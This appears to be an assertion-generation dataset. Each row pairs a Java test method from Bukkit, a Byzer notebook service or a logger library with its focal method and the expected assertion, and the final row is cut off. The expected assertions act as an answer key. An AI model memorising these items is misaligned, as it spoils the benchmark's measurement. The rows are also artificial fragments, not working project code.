"toStringWorks() { for (ChatColor color : ChatColor.values()) { ""<AssertPlaceHolder>""; } }
toString() { return toString; }"	"assertThat(String.format(""%c%c"", ChatColor.COLOR_CHAR, color.getChar()), is(color.toString()))"
"translateAlternateColorCodes() { String s = ""&0&1&2&3&4&5&6&7&8&9&A&a&B&b&C&c&D&d&E&e&F&f&K&k & more""; String t = ChatColor.translateAlternateColorCodes('&', s); String u = ChatColor.BLACK.toString() + ChatColor.DARK_BLUE + ChatColor.DARK_GREEN + ChatColor.DARK_AQUA + ChatColor.DARK_RED + ChatColor.DARK_PURPLE + ChatColor.GOLD + ChatColor.GRAY + ChatColor.DARK_GRAY + ChatColor.BLUE + ChatColor.GREEN + ChatColor.GREEN + ChatColor.AQUA + ChatColor.AQUA + ChatColor.RED + ChatColor.RED + ChatColor.LIGHT_PURPLE + ChatColor.LIGHT_PURPLE + ChatColor.YELLOW + ChatColor.YELLOW + ChatColor.WHITE + ChatColor.WHITE + ChatColor.MAGIC + ChatColor.MAGIC + "" & more""; ""<AssertPlaceHolder>""; }
toString() { return toString; }"	assertThat(t, is(u))
"getByData() { for (CoalType coalType : CoalType.values()) { ""<AssertPlaceHolder>""; } }
getData() { return data; }"	assertThat(CoalType.getByData(coalType.getData()), is(coalType))
"Throwable { for (TestColor testColor : examples) { Color base = Color.fromRGB(testColor.rgb);  YamlConfiguration toSerialize = new YamlConfiguration(); toSerialize.set(""color"", base); String serialized = toSerialize.saveToString();  YamlConfiguration deserialized = new YamlConfiguration(); deserialized.loadFromString(serialized);  ""<AssertPlaceHolder>""; } }
fromRGB(int rgb) throws IllegalArgumentException { Validate.isTrue((rgb >> 24) == 0, ""Extrenuous data in: "", rgb); return fromRGB(rgb >> 16 & BIT_MASK, rgb >> 8 & BIT_MASK, rgb >> 0 & BIT_MASK); }"	"assertThat(testColor.name + "" on "" + serialized, base, is(deserialized.getColor(""color"")))"
"getByData() { for (CropState cropState : CropState.values()) { ""<AssertPlaceHolder>""; } }
getData() { return data; }"	assertThat(CropState.getByData(cropState.getData()), is(cropState))
"getByValue() { for (Difficulty difficulty : Difficulty.values()) { ""<AssertPlaceHolder>""; } }
getValue() { return value; }"	assertThat(Difficulty.getByValue(difficulty.getValue()), is(difficulty))
"getByWoolData() { byte data = dye.getWoolData();  DyeColor byData = DyeColor.getByWoolData(data); ""<AssertPlaceHolder>""; }
getByWoolData(final byte data) { int i = 0xff & data; if (i >= BY_WOOL_DATA.length) { return null; } return BY_WOOL_DATA[i]; }"	assertThat(byData, is(dye))
"getByDyeData() { byte data = dye.getDyeData();  DyeColor byData = DyeColor.getByDyeData(data); ""<AssertPlaceHolder>""; }
getByDyeData(final byte data) { int i = 0xff & data; if (i >= BY_DYE_DATA.length) { return null; } return BY_DYE_DATA[i]; }"	assertThat(byData, is(dye))
"getByData() { for (EntityEffect entityEffect : EntityEffect.values()) { ""<AssertPlaceHolder>""; } }
getData() { return data; }"	assertThat(EntityEffect.getByData(entityEffect.getData()), is(entityEffect))
"getByValue() { for (GameMode gameMode : GameMode.values()) { ""<AssertPlaceHolder>""; } }
getValue() { return value; }"	assertThat(GameMode.getByValue(gameMode.getValue()), is(gameMode))
"getByData() { for (GrassSpecies grassSpecies : GrassSpecies.values()) { ""<AssertPlaceHolder>""; } }
getData() { return data; }"	assertThat(GrassSpecies.getByData(grassSpecies.getData()), is(grassSpecies))
"getByType() { for (Instrument instrument : Instrument.values()) { ""<AssertPlaceHolder>""; } }
getType() { return this.type; }"	assertThat(Instrument.getByType(instrument.getType()), is(instrument))
"Throwable { for (Material material : Material.values()) { if (material.getClass().getField(material.name()).getAnnotation(Deprecated.class) != null) { continue; } ""<AssertPlaceHolder>""; } }
getId() { return id; }"	assertThat(Material.getMaterial(material.getId()), is(material))
"isBlock() { for (Material material : Material.values()) { if (material.getId() > 255) continue;  ""<AssertPlaceHolder>""; } }
isBlock() { return id < 256; }"	"assertTrue(String.format(""[%d] %s"", material.getId(), material.toString()), material.isBlock())"
"getData() { for (Material material : Material.values()) { Class<? extends MaterialData> clazz = material.getData();  ""<AssertPlaceHolder>""; } }
getNewData(final byte raw) { try { return ctor.newInstance(id, raw); } catch (InstantiationException ex) { final Throwable t = ex.getCause(); if (t instanceof RuntimeException) { throw (RuntimeException) t; } if (t instanceof Error) { throw (Error) t; } throw new AssertionError(t); } catch (Throwable t) { throw new AssertionError(t); } }"	assertThat(material.getNewData((byte) 0), is(instanceOf(clazz)))
"Throwable { for (Material material : Material.values()) { if (material.getClass().getField(material.name()).getAnnotation(Deprecated.class) != null) { continue; } ""<AssertPlaceHolder>""; } }
getId() { return id; }"	assertThat(Material.matchMaterial(String.valueOf(material.getId())), is(material))
"matchMaterialByName() { for (Material material : Material.values()) { ""<AssertPlaceHolder>""; } }
matchMaterial(final String name) { Validate.notNull(name, ""Name cannot be null"");  Material result = null;  try { result = getMaterial(Integer.parseInt(name)); } catch (NumberFormatException ex) {}  if (result == null) { String filtered = name.toUpperCase();  filtered = filtered.replaceAll(""\\s+"", ""_"").replaceAll(""\\W"", """"); result = BY_NAME.get(filtered); }  return result; }"	assertThat(Material.matchMaterial(material.toString()), is(material))
"matchMaterialByLowerCaseAndSpaces() { for (Material material : Material.values()) { String name = material.toString().replaceAll(""_"", "" "").toLowerCase(); ""<AssertPlaceHolder>""; } }
matchMaterial(final String name) { Validate.notNull(name, ""Name cannot be null"");  Material result = null;  try { result = getMaterial(Integer.parseInt(name)); } catch (NumberFormatException ex) {}  if (result == null) { String filtered = name.toUpperCase();  filtered = filtered.replaceAll(""\\s+"", ""_"").replaceAll(""\\W"", """"); result = BY_NAME.get(filtered); }  return result; }"	assertThat(Material.matchMaterial(name), is(material))
"getByData() { for (TreeSpecies treeSpecies : TreeSpecies.values()) { ""<AssertPlaceHolder>""; } }
getData() { return data; }"	assertThat(TreeSpecies.getByData(treeSpecies.getData()), is(treeSpecies))
"getByName() { for (WorldType worldType : WorldType.values()) { ""<AssertPlaceHolder>""; } }
getName() { return name; }"	assertThat(WorldType.getByName(worldType.getName()), is(worldType))
"testGetCurrentPath() { ConfigurationSection section = getConfigurationSection();  ""<AssertPlaceHolder>""; }
getCurrentPath();  /** * Gets the name of this individual {@link ConfigurationSection}"	assertEquals(section.getName(), section.getCurrentPath())
"testCreateSection() { ConfigurationSection section = getConfigurationSection(); ConfigurationSection subsection = section.createSection(""subsection"");  ""<AssertPlaceHolder>""; }
getName();  /** * Gets the root {@link Configuration}"	"assertEquals(""subsection"", subsection.getName())"
"testSectionMap() { ConfigurationSection config = getConfigurationSection(); Map<String, Object> testMap = new LinkedHashMap<String, Object>();  testMap.put(""string"", ""Hello World""); testMap.put(""integer"", 15);  config.createSection(""test.path"", testMap);  ""<AssertPlaceHolder>""; }
getValues(boolean deep);  /** * Checks if this {@link ConfigurationSection}"	"assertEquals(testMap, config.getConfigurationSection(""test.path"").getValues(false))"
"testGetConfigurationSection() { ConfigurationSection section = getConfigurationSection(); String key = ""exists"";  ConfigurationSection subsection = section.createSection(key);  ""<AssertPlaceHolder>""; }
getConfigurationSection(String path);  /** * Checks if the specified path is a ConfigurationSection. * <p> * If the path exists but is not a ConfigurationSection, this will return * false. If the path does not exist, this will return false. If the path * does not exist but a default value has been specified, this will check * if that default value is a ConfigurationSection and return * appropriately. * * @param path Path of the ConfigurationSection to check. * @return Whether or not the specified path is a ConfigurationSection. */ public boolean isConfigurationSection(String path);  /** * Gets the equivalent {@link ConfigurationSection}"	assertEquals(subsection, section.getConfigurationSection(key))
"testGetDefaults() { Configuration config = getConfig(); Configuration defaults = getConfig();  config.setDefaults(defaults);  ""<AssertPlaceHolder>""; }
getDefaults();  /** * Gets the {@link ConfigurationOptions}"	assertEquals(defaults, config.getDefaults())
"testSaveToString() { FileConfiguration config = getConfig();  for (Map.Entry<String, Object> entry : getTestValues().entrySet()) { config.set(entry.getKey(), entry.getValue()); }  String result = config.saveToString(); String expected = getTestValuesString();  ""<AssertPlaceHolder>""; }
saveToString();  /** * Loads this {@link FileConfiguration}"	assertEquals(expected, result)
"testSaveToStringWithHeader() { FileConfiguration config = getConfig(); config.options().header(getTestHeaderInput());  for (Map.Entry<String, Object> entry : getTestValues().entrySet()) { config.set(entry.getKey(), entry.getValue()); }  String result = config.saveToString(); String expected = getTestHeaderResult() + ""\n"" + getTestValuesString();  ""<AssertPlaceHolder>""; }
saveToString();  /** * Loads this {@link FileConfiguration}"	assertEquals(expected, result)
"testSaveToStringWithIndent() { YamlConfiguration config = getConfig(); config.options().indent(9);  config.set(""section.key"", 1);  String result = config.saveToString(); String expected = ""section:\n         key: 1\n"";  ""<AssertPlaceHolder>""; }
saveToString() { yamlOptions.setIndent(options().indent()); yamlOptions.setDefaultFlowStyle(DumperOptions.FlowStyle.BLOCK); yamlOptions.setAllowUnicode(SYSTEM_UTF); yamlRepresenter.setDefaultFlowStyle(DumperOptions.FlowStyle.BLOCK);  String header = buildHeader(); String dump = yaml.dump(getValues(false));  if (dump.equals(BLANK_CONFIG)) { dump = """"; }  return header + dump; }"	assertEquals(expected, result)
"TestFromWhom() { Conversable conversable = new FakeConversable(); ConversationContext context = new ConversationContext(null, conversable, new HashMap<Object, Object>()); ""<AssertPlaceHolder>""; }
getForWhom() { return forWhom; }"	assertEquals(conversable, context.getForWhom())
"TestPlugin() { Conversable conversable = new FakeConversable(); ConversationContext context = new ConversationContext(null, conversable, new HashMap<Object, Object>()); ""<AssertPlaceHolder>""; }
getPlugin() { return plugin; }"	assertEquals(null, context.getPlugin())
"testInvalidateDoesNothing() { Object o = new Object(); subject = new FixedMetadataValue(plugin, o); subject.invalidate(); ""<AssertPlaceHolder>""; }
value() { return internalValue; }"	assertSame(o, subject.value())
"testLazyInt() { int value = 10; subject = makeSimpleCallable(value);  ""<AssertPlaceHolder>""; }
value() { eval(); Object value = internalValue.get(); if (value == ACTUALLY_NULL) { return null; } return value; }"	assertEquals(value, subject.value())
"testLazyDouble() { double value = 10.5; subject = makeSimpleCallable(value);  ""<AssertPlaceHolder>""; }
value() { eval(); Object value = internalValue.get(); if (value == ACTUALLY_NULL) { return null; } return value; }"	assertEquals(value, (Double)subject.value(), 0.01)
"testLazyString() { String value = ""TEN""; subject = makeSimpleCallable(value);  ""<AssertPlaceHolder>""; }
value() { eval(); Object value = internalValue.get(); if (value == ACTUALLY_NULL) { return null; } return value; }"	assertEquals(value, subject.value())
"testLazyBoolean() { boolean value = false; subject = makeSimpleCallable(value);  ""<AssertPlaceHolder>""; }
value() { eval(); Object value = internalValue.get(); if (value == ACTUALLY_NULL) { return null; } return value; }"	assertEquals(value, subject.value())
"testStringConversionNull() { ""<AssertPlaceHolder>""; }
asString() { Object value = value();  if (value == null) { return """"; } return value.toString(); }"	"assertEquals("""", simpleValue(null).asString())"
"testAsyncSameThread() { final Event event = new TestEvent(true); try { pm.callEvent(event); } catch (IllegalStateException ex) { ""<AssertPlaceHolder>""; return; } throw new IllegalStateException(""No exception thrown""); }
callEvent(Event event) throws IllegalStateException;  /** * Registers all the events in the given listener class * * @param listener Listener to register * @param plugin Plugin to register */ public void registerEvents(Listener listener, Plugin plugin);  /** * Registers the specified executor to the given event class * * @param event Event type to register * @param listener Listener to register * @param priority Priority to register this event at * @param executor EventExecutor to register * @param plugin Plugin to register */ public void registerEvent(Class<? extends Event> event, Listener listener, EventPriority priority, EventExecutor executor, Plugin plugin);  /** * Registers the specified executor to the given event class * * @param event Event type to register * @param listener Listener to register * @param priority Priority to register this event at * @param executor EventExecutor to register * @param plugin Plugin to register * @param ignoreCancelled Whether to pass cancelled events or not */ public void registerEvent(Class<? extends Event> event, Listener listener, EventPriority priority, EventExecutor executor, Plugin plugin, boolean ignoreCancelled);  /** * Enables the specified plugin * <p> * Attempting to enable a plugin that is already enabled will have no * effect * * @param plugin Plugin to enable */ public void enablePlugin(Plugin plugin);  /** * Disables the specified plugin * <p> * Attempting to disable a plugin that is not enabled will have no effect * * @param plugin Plugin to disable */ public void disablePlugin(Plugin plugin);  /** * Gets a {@link Permission}"	"assertThat(event.getEventName() + "" cannot be triggered asynchronously from primary server thread."", is(ex.getMessage()))"
"applyToItemStack() { Potion potion = new Potion(PotionType.POISON); ItemStack stack = new ItemStack(Material.POTION, 1); potion.apply(stack); ""<AssertPlaceHolder>""; }
toDamageValue() { short damage; if (type == PotionType.WATER) { return 0; } else if (type == null) { // Without this, mundanePotion.toDamageValue() would return 0 damage = (short) (name == 0 ? 8192 : name); } else { damage = (short) (level - 1); damage <<= TIER_SHIFT; damage |= (short) type.getDamageValue(); } if (splash) { damage |= SPLASH_BIT; } if (extended) { damage |= EXTENDED_BIT; } return damage; }"	assertTrue(stack.getDurability() == potion.toDamageValue())
"testTypes() { for (WorldType type : WorldType.types) { if (type == null) continue; if (type == WorldType.DEBUG_ALL_BLOCK_STATES) continue; // Doesn't work anyway  ""<AssertPlaceHolder>""; } }
getByName(String name) { return BY_NAME.get(name.toUpperCase()); }"	"assertThat(type.name() + "" has no Bukkit world"", org.bukkit.WorldType.getByName(type.name()), is(not(nullValue())))"
"testRenderSQL() { String expectSQL = ""connect jdbc where\n"" + ""url=""jdbc:mysql://localhost:3306/notebook""\n"" + ""and driver=""com.mysql.jdbc.Driver""\n"" + ""and user=""root""\n"" + ""and password=""root""\n"" + ""as admin-mockConnectionForAdmin;""; Assert.""<AssertPlaceHolder>""; }
renderConnectionSQL(ConnectionInfo info) { List<ConnectionDTO.ParameterMap> parameter = new ArrayList<>(); if (info.getParameter() != null) { parameter = JacksonUtils.readJsonArray(info.getParameter(), ConnectionDTO.ParameterMap.class); } return ConnectionUtils.renderSQL( info.getUrl(), info.getDriver(), info.getUserName(), info.getPassword(), info.getName(), parameter ); }"	assertEquals(expectSQL, connectionService.renderConnectionSQL(MOCK_CONNECTION))
"testRunScript() { String resp = engineService.runScript(new EngineService.RunScriptParams().withSql(testSQL).withAsync(""false"")); Assert.""<AssertPlaceHolder>""; }
withAsync(String async) { params.put(""async"", async); return this; }"	assertNotNull(resp)
"testRunAnalyze() { String resp = engineService.runAnalyze(new EngineService.RunScriptParams() .withSql(""load Everything.`` as Table;"").withAsync(""false"")); Assert.""<AssertPlaceHolder>""; }
withAsync(String async) { params.put(""async"", async); return this; }"	assertNotNull(resp)
"testRunAutoSuggest() { String resp = engineService.runAutoSuggest(new EngineService.RunScriptParams().withSql(""s"").withAsync(""false"")); Assert.""<AssertPlaceHolder>""; }
withAsync(String async) { params.put(""async"", async); return this; }"	assertNotNull(resp)
"testGetJobLog() { when(mockEngineService.runScript(any())).thenReturn(getResponseContent(MOCK_JOB_LOG)); JobLog jobLog = mockJobService.getJobLog(""admin"", mockJobId, -1L); Assert.""<AssertPlaceHolder>""; }
getJobLog(String user, String jobId, Long offset) { String groupId = getGroupOrJobId(jobId); String response = null; try { response = engineService.runScript(new EngineService .RunScriptParams() .withOwner(user) .withSql(String.format(""load _mlsql_.`log/%d` where filePath=""engine_log"" as output;"", offset)) .withAsync(""false"") .with(""sessionPerRequest"", ""true"") ); } catch (Exception e) { log.error(ExceptionUtils.getRootCause(e)); } if (StringUtils.isEmpty(response) || response.equals(""[]"")) { return null; }  List<JobLog> resultsMap = JacksonUtils.readJsonArray(response, JobLog.class); JobLog jobLog = Objects.requireNonNull(resultsMap).get(0); if (jobLog.getValue() != null) { jobLog.setValue( jobLog.getValue().stream().filter( s -> s.contains(String.format(""[owner] [%s] [groupId]"", user)) ).filter(s-> !s.contains(""run command as ShowCommand.`jobs/v2"")).map(s -> { String[] arr = s.split(""__MMMMMM__"", 2); if (arr.length == 2) { return arr[1]; } else { return s; } }).collect(Collectors.toList()) ); } else { jobLog.setValue(Lists.newArrayList()); } return jobLog; }"	assertNotNull(jobLog)
"testUpdateByJobId() { JobInfo jobInfo = new JobInfo(); jobInfo.setJobId(testJobId2); String content = ""!profiler sql ''' select 1 as a ''' ;""; jobInfo.setContent(content); jobService.updateByJobId(jobInfo); JobInfo updatedJobInfo = jobService.findByJobId(testJobId2); Assert.""<AssertPlaceHolder>""; }
findByJobId(String jobId) { List<JobInfo> jobInfoList = jobInfoRepository.findByJobId(jobId); return jobInfoList.isEmpty() ? null : jobInfoList.get(0); }"	assertEquals(content, updatedJobInfo.getContent())
"testInsert() { String jobId = ""05be74e3-30ad-4055-b524-cc5101e10e2b""; insertJobInfo(jobId, JobInfo.JobStatus.KILLED, ""TEST2""); JobInfo jobInfo = jobService.findByJobId(jobId); Assert.""<AssertPlaceHolder>""; jobInfoRepository.delete(jobInfo); }
findByJobId(String jobId) { List<JobInfo> jobInfoList = jobInfoRepository.findByJobId(jobId); return jobInfoList.isEmpty() ? null : jobInfoList.get(0); }"	assertEquals(jobInfo.getJobId(), jobId)
"testGetJobArchiveList() { JobInfoArchive jobInfoArchive = new JobInfoArchive(testJobId2, JobInfo.JobStatus.SUCCESS); jobInfoArchive.setUser(""TEST""); jobInfoArchive.setContent(""""); jobInfoArchive.setName(""mock-test-archive""); jobInfoArchiveRepository.save(jobInfoArchive);   Pair<Long, List<JobInfoArchive>> result = jobService.getJobArchiveList(null, null, null, null, null, ""TEST"", null); Assert.""<AssertPlaceHolder>""; }
getJobArchiveList(Integer pageSize, Integer pageOffset, String sortBy, Boolean reverse, String status, String user, String keyword) { return getJobList(JobInfoArchive.class, pageSize, pageOffset, sortBy, reverse, status, user, keyword); }"	assertEquals(1, (long) result.getFirst())
"testListCommits() { Assert.""<AssertPlaceHolder>""; }
listCommits(String user, Integer notebookId) { NotebookInfo notebookInfo = this.findById(notebookId); checkExecFileAvailable(user, notebookInfo, null); return notebookCommitRepository.listCommit(notebookId); }"	assertNotNull(nbService.listCommits(DEFAULT_ADMIN_USER, Integer.valueOf(defaultMockNotebookId)))
"testUpdateCellContent() { String newContent = ""select ""isMock"" as mockData as output;""; CellInfo cellInfo = nbService.getCellInfos(Integer.valueOf(defaultMockNotebookId)).get(0); cellInfo.setContent(newContent); nbService.updateCellContent(cellInfo); CellInfo newCellInfo = nbService.getCellInfo(cellInfo.getId()); Assert.""<AssertPlaceHolder>""; }
getCellInfo(Integer cellId) { return cellInfoRepository.findById(cellId).orElse(null); }"	assertEquals(newContent, newCellInfo.getContent())
"testUpdateCellJobId() { String newJobId = ""7aaa242e-88fe-4500-a379-38e911e391b6""; CellInfo cellInfo = nbService.getCellInfos(Integer.valueOf(defaultMockNotebookId)).get(0); cellInfo.setLastJobId(newJobId); nbService.updateCellJobId(cellInfo); CellInfo newCellInfo = nbService.getCellInfo(cellInfo.getId()); Assert.""<AssertPlaceHolder>""; }
getCellInfo(Integer cellId) { return cellInfoRepository.findById(cellId).orElse(null); }"	assertEquals(newJobId, newCellInfo.getLastJobId())
"testDeleteNotebook() { String testNotebookName = ""TEST_DELETE_NOTEBOOK""; NotebookInfo nb = nbService.create(DEFAULT_ADMIN_USER, testNotebookName, null); nbService.delete(nb.getId()); Assert.""<AssertPlaceHolder>""; }
findById(Integer id) { return notebookRepository.findById(id).orElse(null); }"	assertNull(nbService.findById(nb.getId()))
"testGetScheduleById() { when(mockInterface.getTask(any(), eq(mockUser), eq(mockTaskId))) .thenReturn(new TaskInfoDTO()); Assert.""<AssertPlaceHolder>"";  thrown.expect(ByzerException.class); thrown.expectMessage(""SchedulerService not enabled""); schedulerService.getScheduleById(""mock-user"", null, null, 1); }
getScheduleById(String user, Integer schedulerId, String projectName, Integer taskId) { if (!enabled) throw new ByzerException(""SchedulerService not enabled""); RemoteSchedulerInterface scheduler = schedulerMap.get(Objects.isNull(schedulerId) ? 1 : schedulerId); return scheduler.getTask(projectName, user, taskId); }"	assertNotNull(mockService.getScheduleById(mockUser, mockSchedulerId, null, mockTaskId))
"testGetScheduleList() { List<TaskInfoDTO> mockData = new ArrayList<>(); mockData.add(new TaskInfoDTO()); mockData.add(new TaskInfoDTO()); when(mockInterface.getTasks(any(), eq(mockUser))) .thenReturn(mockData); Assert.""<AssertPlaceHolder>"";  thrown.expect(ByzerException.class); thrown.expectMessage(""SchedulerService not enabled""); schedulerService.getScheduleList(""mock-user"", null, null); }
getScheduleList(String user, Integer schedulerId, String projectName) { if (!enabled) throw new ByzerException(""SchedulerService not enabled""); RemoteSchedulerInterface scheduler = schedulerMap.get(Objects.isNull(schedulerId) ? 1 : schedulerId); return scheduler.getTasks(projectName, user); }"	assertEquals(mockData.size(), mockService.getScheduleList(mockUser, mockSchedulerId, null).size())
"testGetInstanceNodes() { List<TaskNodeInfoDTO> mockData = new ArrayList<>(); mockData.add(new TaskNodeInfoDTO()); mockData.add(new TaskNodeInfoDTO());  when(mockInterface.getTaskInstanceNodes(any(), eq(mockUser), eq(mockTaskInstanceId))) .thenReturn(mockData);  Assert.""<AssertPlaceHolder>""; thrown.expect(ByzerException.class); thrown.expectMessage(""SchedulerService not enabled""); schedulerService.getInstanceNodes(""mock-user"", 1000L, null, null); }
getInstanceNodes(String user, Long taskInstanceId, Integer schedulerId, String projectName) { if (!enabled) throw new ByzerException(""SchedulerService not enabled""); RemoteSchedulerInterface scheduler = schedulerMap.get(Objects.isNull(schedulerId) ? 1 : schedulerId); return scheduler.getTaskInstanceNodes(projectName, user, taskInstanceId); }"	assertEquals(mockData.size(), mockService.getInstanceNodes(mockUser, mockTaskInstanceId, mockSchedulerId, null).size())
"testGetInstanceList() { List<TaskInstanceDTO> mockData = new ArrayList<>(); TaskInstanceDTO t1 = new TaskInstanceDTO(); t1.setOwner(mockUser); t1.setTaskId(mockTaskId); TaskInstanceDTO t2 = new TaskInstanceDTO(); t2.setOwner(mockUser); t2.setTaskId(10); mockData.add(t2); mockData.add(t1);  when(mockInterface.getTaskInstances(any(), eq(mockUser))).thenReturn(mockData); Assert.""<AssertPlaceHolder>""; thrown.expect(ByzerException.class); thrown.expectMessage(""SchedulerService not enabled""); schedulerService.getInstanceList(""mock-user"", null, null, mockTaskId); }
getInstanceList(String user, Integer schedulerId, String projectName, Integer taskId) { if (!enabled) throw new ByzerException(""SchedulerService not enabled""); RemoteSchedulerInterface scheduler = schedulerMap.get(Objects.isNull(schedulerId) ? 1 : schedulerId); List<TaskInstanceDTO> instances = scheduler.getTaskInstances(projectName, user); return Objects.isNull(taskId) ? instances : instances.stream().filter( instance -> Objects.equals(instance.getTaskId(), taskId)).collect(Collectors.toList()); }"	assertEquals(1, mockService.getInstanceList(mockUser, mockSchedulerId, null, mockTaskId).size())
"testGetInstanceStatus() { String status = ""RUNNING""; when(mockInterface.getTaskInstanceStatus(any(), eq(mockUser), eq(mockTaskInstanceId))) .thenReturn(status); Assert.""<AssertPlaceHolder>""; thrown.expect(ByzerException.class); thrown.expectMessage(""SchedulerService not enabled""); schedulerService.getInstanceStatus(""mock-user"", mockTaskInstanceId, mockSchedulerId, null); }
getInstanceStatus(String user, Long taskInstanceId, Integer schedulerId, String projectName) { if (!enabled) throw new ByzerException(""SchedulerService not enabled""); RemoteSchedulerInterface scheduler = schedulerMap.get(Objects.isNull(schedulerId) ? 1 : schedulerId); return scheduler.getTaskInstanceStatus(projectName, user, taskInstanceId); }"	assertEquals(status, mockService.getInstanceStatus(mockUser, mockTaskInstanceId, mockSchedulerId, null))
"testUpdateConfig() { SystemConfig config = systemService.getConfig(""mockConfigUser2""); config.setEngine(""backup""); systemService.updateByUser(config); config = systemService.getConfig(""mockConfigUser2""); Assert.""<AssertPlaceHolder>""; }
getConfig(String user) { List<SystemConfig> systemConfigs = repository.findByUser(user); if (systemConfigs.isEmpty()) { SystemConfig systemConfig =  new SystemConfig(); systemConfig.setUser(user); systemConfig.setEngine(notebookConfig.getExecutionEngine()); systemConfig.setTimeout(notebookConfig.getExecutionTimeout()); return repository.save(systemConfig); } return systemConfigs.get(0); }"	"assertEquals(""backup"", config.getEngine())"
"testUpdateUser() { UserInfo user = new UserInfo();  user.setName(""testUser2""); user.setPassword(EncryptUtils.encrypt(""pwdForUser2""));  user = userService.createUser(user);  user.setPassword(EncryptUtils.encrypt(""pwdChanged"")); UserInfo updated = userService.updateUser(user);  Assert.""<AssertPlaceHolder>"";  }
updateUser(UserInfo userInfo){ return userInfoRepository.save(userInfo); }"	"assertEquals(""pwdChanged"", EncryptUtils.decrypt(updated.getPassword()))"
"testCreate() { String testWorkflowName = ""test-create-workflow""; WorkflowInfo workflowInfo = workflowService.create(DEFAULT_ADMIN_USER, testWorkflowName, null); Assert.""<AssertPlaceHolder>""; }
create(String user, String name, Integer folderId) { if (isWorkflowExist(user, name, folderId)) { throw new ByzerException(ErrorCodeEnum.DUPLICATE_WORKFLOW_NAME); }  long currentTimeStamp = System.currentTimeMillis(); WorkflowInfo workflowInfo = new WorkflowInfo(); workflowInfo.setName(name); workflowInfo.setUser(user); workflowInfo.setCreateTime(new Timestamp(currentTimeStamp)); workflowInfo.setUpdateTime(new Timestamp(currentTimeStamp)); workflowInfo.setFolderId(folderId); return workflowRepository.save(workflowInfo); }"	assertEquals(testWorkflowName, workflowInfo.getName())
"testDeleteNode() { NodeInfoDTO.NodeContent c = new NodeInfoDTO.NodeContent(); c.setSql(""select * from tL as tM""); NodeInfo nodeInfo = workflowService.createNode(mockWorkflowId, DEFAULT_ADMIN_USER, NodeUtils.NodeType.SELECT, c, new NodeInfoDTO.NodePosition()); workflowService.deleteNode(mockWorkflowId, nodeInfo.getId(), DEFAULT_ADMIN_USER); Assert.""<AssertPlaceHolder>""; }
findNodeById(Integer id) { return nodeInfoRepository.findById(id).orElse(null); }"	assertNull(workflowService.findNodeById(nodeInfo.getId()))
"testUpdateNodePosition() { NodeInfoDTO.NodeContent c = new NodeInfoDTO.NodeContent(); NodeInfoDTO.NodePosition p = new NodeInfoDTO.NodePosition(); p.setX(""100""); p.setY(""100""); c.setSql(""select * from tP as tQ""); NodeInfo nodeInfo = workflowService.createNode(mockWorkflowId, DEFAULT_ADMIN_USER, NodeUtils.NodeType.SELECT, c, p);  p.setY(""200"");  NodeInfo updated = workflowService.updateNodePosition(mockWorkflowId, nodeInfo.getId(), DEFAULT_ADMIN_USER, p);  String newY = Objects.requireNonNull(JacksonUtils.readJson(updated.getPosition(), NodeInfoDTO.NodePosition.class)).getY(); Assert.""<AssertPlaceHolder>"";  }
updateNodePosition(Integer workflowId, Integer nodeId, String user, NodeInfoDTO.NodePosition position) { WorkflowInfo workflowInfo = findById(workflowId); checkExecFileAvailable(user, workflowInfo, null); NodeInfo nodeInfo = findNodeById(nodeId);  if (nodeInfo == null) { throw new ByzerException(ErrorCodeEnum.NODE_NOT_EXIST); } String positionString = JacksonUtils.writeJson(position); nodeInfoRepository.updateNodePosition(nodeId, positionString); nodeInfo.setPosition(positionString); return nodeInfo; }"	"assertEquals(""200"", newY)"
"testListOutput() { Assert.""<AssertPlaceHolder>""; }
listOutput(Integer workflowId) { Set<String> outputList = new HashSet<>();  List<NodeInfo> nodeInfoList = nodeInfoRepository.findByWorkflow(workflowId); for (NodeInfo node : nodeInfoList) { if (node.getType().equalsIgnoreCase(NodeUtils.NodeType.TRAIN)) continue; else if (node.getType().equalsIgnoreCase(NodeUtils.NodeType.ET)) { NodeInfoDTO.NodeContent content = JacksonUtils.readJson(node.getContent(), NodeInfoDTO.NodeContent.class); if (Objects.nonNull(content.getEtId()) && etOutputIsModel(content.getEtId())) continue; } List<String> outputs = JacksonUtils.readJsonArray(node.getOutput(), String.class); if (outputs != null) outputList.addAll(outputs); } return outputList; }"	"assertTrue(workflowService.listOutput(mockWorkflowId).contains(""tB""))"
"testDelete() { WorkflowInfo workflowInfo = workflowService.create(""userForDelete"", ""WorkflowForDelete"", null); workflowService.delete(workflowInfo.getId());  Assert.""<AssertPlaceHolder>""; }
findById(Integer id) { return workflowRepository.findById(id).orElse(null); }"	assertNull(workflowService.findById(workflowInfo.getId()))
"IOException { Logger.log(""test2""); Logger.error(""test2 ERR""); Logger.warn(""test2 WRN""); Logger.info(""test2 INF""); Logger.debug(""test2 DBG""); ""<AssertPlaceHolder>""; }
debug(String msg) { log(msg, Level.DEBUG); }"	"assertEquals(5, countOccurrenceOf(""test2""))"
"IOException { Logger.log(""Current time is: "" + Logger.time()); Logger.log(""Current date is: "" + Logger.date()); ""<AssertPlaceHolder>""; }
date() { return DATE_FORMAT.format(Calendar.getInstance().getTime()); }"	"assertEquals(2, countOccurrenceOf(""Current ""))"
"IOException { Logger.printf(""printf no args""); Logger.printf(""printf %d %s 0x%X"", 1234, ""5678"", 3735928559L); Logger.printf(Logger.Level.WARNING, ""printf warning no args""); Logger.printf(Logger.Level.INFO, ""printf info %d %s 0x%X"", 1234, ""5678"", 3735928559L); ""<AssertPlaceHolder>""; }
printf(String format, Object... args) { printf(Level.RAW, format, args); }"	"assertEquals(4, countOccurrenceOf(""printf""))"
"IOException { Logger.redirectStandardError(""test""); System.err.println(""std error test 1""); System.err.println(""std error test 2""); System.err.println(""std error test 3""); int counter = 0; try (BufferedReader reader = new BufferedReader(new FileReader(""test.err""))) { while (reader.ready()) { String line = reader.readLine(); if (line.contains(""std error test"")) { counter++; } } } ""<AssertPlaceHolder>""; }
redirectStandardError(String path) throws IOException { if (!path.toLowerCase().endsWith("".err"")) path += "".err""; File errorFile = new File(path); if (!errorFile.createNewFile()) { errorFile.delete(); errorFile.createNewFile(); } PrintStream stdErr = new PrintStream(new FileOutputStream(errorFile), true); System.setErr(stdErr); System.err.println(""======= ERROR CREATED on "" + date() + "" =======""); }"	assertEquals(3, counter)
"getExtensionLoaderTest() { ExtensionLoader<?> extensionLoader = ExtensionLoader.getLoader(Extension.class); Assert.""<AssertPlaceHolder>""; }
